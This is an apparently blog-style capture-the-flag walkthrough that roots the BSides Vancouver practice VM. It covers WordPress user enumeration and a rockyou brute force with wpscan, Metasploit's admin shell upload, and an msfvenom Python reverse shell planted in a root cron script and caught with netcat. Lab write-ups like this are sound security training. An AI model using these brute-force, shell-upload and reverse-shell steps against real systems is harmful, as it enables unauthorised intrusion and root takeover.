									Hello friends! Today we are going to take another CTF challenge known as BSides Vancouver. The credit for making this VM machine goes to “Abatchy” and it is another capture the flag challenge in which our goal is to gain root access and capture the flag to complete the challenge. You can download this VM here.
Let’s Breach!!!
Let’s start from getting to know the IP of VM  with help of netdiscover Command (Here, I have it at 192.168.1.103 but you will have to find your own). Now let’s move towards enumeration in context to identify running services and open of victim’s machine by using the most popular tool Nmap.

		
		
			
			
			
			
nmap -p- -A 192.168.1.103 --open
			
				
					
				
					1
				
						nmap -p- -A 192.168.1.103 --open
					
				
			
		

Awesome!! Nmap has done a remarkable job by dumbing the details of services running on open port 21, 22 and 80.
Moreover, the highlighted text is revealing the following details:

FTP Anonymous login allowed
Found a directory /backup WordPress with help of txt


Without wasting time we accessed the FTP service of the victim’s system and found a user.txt.bk, let’s look into this file.

Its look like a text file with some username in it. Since port 22 is open so we can use these name for login into ssh if possible.

If you recall nmap result then it has shown /back_wordpress directory which we had to explore in our web browser but Sadly we didn’t get anything from this web page although it sounds for WordPress site which is also a good sing.

Now we decided to use the command on the URL that we have entered in the browser. To check if there are any kind of vulnerable themes, plugins, username and etc.

		
		
			
			
			
			
wpscan –u http://192.168.1.103/backup_wordpress/ --enumerate t --enumerate p --enumerate u
			
				
					
				
					1
				
						wpscan –u http://192.168.1.103/backup_wordpress/ --enumerate t --enumerate p --enumerate u
					
				
			
		


The wpscan has enumerated the usernames where we have found the login credentials as admin and John.

Again we have used wpscan to find out the password credentials for the login credentials john. Here we have used the following command to enumerate the password from the rockyou.txt file.

		
		
			
			
			
			
wpscan –u http://192.168.1.103/backup_wordpress --username john --wordlist /usr/share/wordlists/rockyou.txt
			
				
					
				
					1
				
						wpscan –u http://192.168.1.103/backup_wordpress --username john --wordlist /usr/share/wordlists/rockyou.txt
					
				
			
		


We see that for login credentials john, the password credentials matched is enigma.

After finding the username and password, we have used metasploit’s exploit wp_admin_shell_upload to upload the shell and get the meterpreter which is shown below.

		
		
			
			
			
			
use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.103
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpress
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username john
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigma
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit
			
				
					
				
					123456
				
						use exploit/unix/webapp/wp_admin_shell_uploadmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.103msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpressmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username johnmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigmamsf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit
					
				
			
		

Great!! We had compromise confidentiality of the target’s system now penetrate more for completing this challenge.

We start penetrating targets machine and after 10-15 mints we came to know about a cleanup file which has root privilege from inside contents of crontab file.

Then we downloaded cleanup file on our desktop so that we can modify it by editing our malicious code.

		
		
			
			
			
			
meterpreter&gt; download cleanup /root/Desktop/
			
				
					
				
					1
				
						meterpreter&gt; download cleanup /root/Desktop/
					
				
			
		


Using msfvenom we had generated a malicious python code by executing following command.

		
		
			
			
			
			
msfvenom -p cmd/unix/reverse_python lhost=192.168.1.108 lport=9876 R
			
				
					
				
					1
				
						msfvenom -p cmd/unix/reverse_python lhost=192.168.1.108 lport=9876 R
					
				
			
		

Then copy the highlighted code for editing into the cleanup file.

We had paste above copied text as the inside cleanup file as shown in below image. In a new terminal, we had start netcat for listening reverse connection.

		
		
			
			
			
			
nc -lvp 9876
			
				
					
				
					1
				
						nc -lvp 9876
					
				
			
		


Now we had to transfer our malicious cleanup file into current directory i.e. /usr/local/bin and verify it using cat command.

		
		
			
			
			
			
meterpreter&gt; upload /root/Desktop/cleanup .
meterpreter&gt;cat cleanup
			
				
					
				
					12
				
						meterpreter&gt; upload /root/Desktop/cleanup .meterpreter&gt;cat cleanup
					
				
			
		


WOW, we got the reverse connection from victims system with root access now let’s catch the flag and finished the task.

		
		
			
			
			
			
id
cd /root
cat flag.txt
			
				
					
				
					123
				
						idcd /rootcat flag.txt
					
				
			
		

solving the challenge in this lab is not that much hectic therefore it is a good task for beginners.
